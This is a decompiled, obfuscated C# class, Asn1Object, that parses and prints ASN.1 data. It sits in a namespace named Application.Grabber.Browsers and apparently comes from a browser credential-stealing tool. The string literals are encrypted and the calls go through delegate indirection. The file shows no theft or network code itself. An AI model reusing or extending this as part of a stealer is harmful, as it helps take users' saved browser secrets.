using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;

namespace Application.Grabber.Browsers
{
	// Token: 0x02000017 RID: 23
	public class Asn1Object
	{
		// Token: 0x17000029 RID: 41
		// (get) Token: 0x060000A0 RID: 160 RVA: 0x000049A4 File Offset: 0x00002BA4
		// (set) Token: 0x060000A1 RID: 161 RVA: 0x000049B8 File Offset: 0x00002BB8
		public Asn1Type ObjectType { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x000049CC File Offset: 0x00002BCC
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x000049E0 File Offset: 0x00002BE0
		public byte[] ObjectData { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x000049F4 File Offset: 0x00002BF4
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x00004A08 File Offset: 0x00002C08
		public List<Asn1Object> Objects { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] set; }

		// Token: 0x060000A6 RID: 166 RVA: 0x00004A1C File Offset: 0x00002C1C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public override string ToString()
		{
			StringBuilder p = new StringBuilder();
			StringBuilder stringBuilder = new StringBuilder();
			Asn1Type objectType = this.ObjectType;
			switch (objectType)
			{
			case Asn1Type.Integer:
				foreach (byte b in this.ObjectData)
				{
					delegate0f9.f000113(stringBuilder, c0000c0.m00000f("ê1w<\u0094\u0014"), b);
				}
				delegate0fb.f000115(delegate0fa.f000114(delegate0f7.f00010f(p, c0000c0.m00000f("\u0098H\u00030ã.ve\u008c")), stringBuilder));
				break;
			case Asn1Type.BitString:
			case Asn1Type.f000028:
				break;
			case Asn1Type.OctetString:
				foreach (byte b2 in this.ObjectData)
				{
					delegate0f9.f000113(stringBuilder, c0000c0.m00000f("ê1w<\u0094\u0014"), b2);
				}
				delegate0f7.f00010e(delegate0f7.f00010f(p, c0000c0.m00000f("\u0098N\u000e0ã=`cþ;\0k(")), delegate0cd.f0000a6(stringBuilder));
				break;
			case Asn1Type.ObjectIdentifier:
				foreach (byte b3 in this.ObjectData)
				{
					delegate0f9.f000113(stringBuilder, c0000c0.m00000f("ê1w<\u0094\u0014"), b3);
				}
				delegate0f7.f00010e(delegate0f7.f00010f(p, c0000c0.m00000f("\u0098N\u000f.ã*g~è7\0xAÑ\u0004\"Ä¢")), delegate0cd.f0000a6(stringBuilder));
				break;
			default:
				if (objectType == Asn1Type.Sequence)
				{
					delegate0f7.f00010e(p, c0000c0.m00000f("ÂD\u001c1ã'pr\u008c\t"));
				}
				break;
			}
			foreach (Asn1Object p2 in this.Objects)
			{
				delegate0f7.f00010f(p, delegate0cd.f0000a6(p2));
			}
			if (this.ObjectType == Asn1Type.Sequence)
			{
				delegate0f7.f00010e(p, c0000c0.m00000f("ì"));
			}
			stringBuilder.Remove(0, delegate0fc.f000116(stringBuilder) - 1);
			return delegate0cd.f0000a6(p);
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00004C5C File Offset: 0x00002E5C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Asn1Object()
		{
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00004C64 File Offset: 0x00002E64
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Asn1Object()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000033 RID: 51
		[CompilerGenerated]
		private Asn1Type f000025;

		// Token: 0x04000034 RID: 52
		[CompilerGenerated]
		private byte[] f000026;

		// Token: 0x04000035 RID: 53
		[CompilerGenerated]
		private List<Asn1Object> f000027;
	}
}
